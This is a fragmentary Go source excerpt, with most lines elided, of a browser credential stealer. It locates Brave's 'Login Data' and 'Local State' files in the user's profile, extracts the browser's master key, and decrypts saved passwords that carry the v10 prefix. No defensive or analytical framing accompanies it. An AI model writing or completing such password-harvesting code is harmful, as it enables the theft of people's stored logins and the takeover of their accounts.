...
var (
	...
	dataPath       = os.Getenv("USERPROFILE") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data"
	localStatePath = os.Getenv("USERPROFILE") + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State"
)
...
func getMasterKey() ([]byte, error) {
	...
	// Get the master key
	// The master key is the key with which Brave encodes the passwords but it has some suffixes and we need to work on it
...
func main() {
	...
	for rows.Next() {
		...
		// Decrypt Passwords
		if strings.HasPrefix(PASSWORD, "v10") { // Means it's Brave 80 or higher
